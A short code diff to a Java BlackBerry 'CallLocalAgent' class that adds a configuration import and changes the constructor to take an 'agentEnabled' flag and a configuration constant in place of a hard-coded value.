@@ -8,6 +8,7 @@
  * *************************************************/
 package blackberry.agent;
 
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
@@ -27,8 +28,8 @@ public final class CallLocalAgent extends Agent {
      * @param agentStatus
      *            the agent status
      */
-    public CallLocalAgent(final boolean agentStatus) {
-        super(Agent.AGENT_CALL_LOCAL, agentStatus, true, "CallLocalAgent");
+    public CallLocalAgent(final boolean agentEnabled) {
+        super(Agent.AGENT_CALL_LOCAL, agentEnabled, Conf.AGENT_CALLLOCAL_ON_SD, "CallLocalAgent");
     }
 
     /**
